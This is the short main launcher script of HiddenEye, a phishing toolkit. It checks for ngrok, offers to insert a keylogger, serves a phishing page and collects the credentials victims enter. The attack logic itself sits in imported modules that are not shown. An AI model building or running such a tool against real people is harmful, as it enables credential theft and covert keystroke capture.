#!/usr/bin/python3
#
#HiddenEye by Open Source Community
#
import multiprocessing
from Defs.Checks import *
from Defs.Configurations import *
from Defs.Actions import *
from Defs.Languages import *
from os import system

RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
checkPermissions()
installGetText()
languageSelector()
checkConnection()
checkNgrok()
ifSettingsNotExists()
readConfig()


if __name__ == "__main__":
    try:
        runMainMenu()

        keyloggerprompt()
        addingkeylogger()

        inputCustom()
        ##############
        selectServer()

        multiprocessing.Process(target=runServer).start()
        getCredentials()

    except KeyboardInterrupt:
        endMessage()
        exit(0)
